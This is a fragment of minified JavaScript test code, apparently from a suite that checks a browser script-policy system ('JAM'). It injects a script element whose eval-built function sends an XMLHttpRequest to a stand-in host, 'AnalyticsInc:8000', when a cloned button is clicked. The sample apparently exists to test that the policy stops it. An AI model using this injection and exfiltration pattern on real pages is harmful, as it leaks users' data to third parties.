function runTest() {
  ...
  function click_inner(){var event=new Event("click");document.getElementById("test2").dispatchEvent(event)}var v1=document.head.childNodes;introspect(JAM.policy.p1)var pol=v1[5];var v2=document.head.childNodes;introspect(JAM.policy.p1)var tx=v2[7];var button=document.getElementById("test"),button2=button.cloneNode(!0);button2.id="test2";var script=document.createElement("script");JAM.set(script,"innerHTML","function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;");
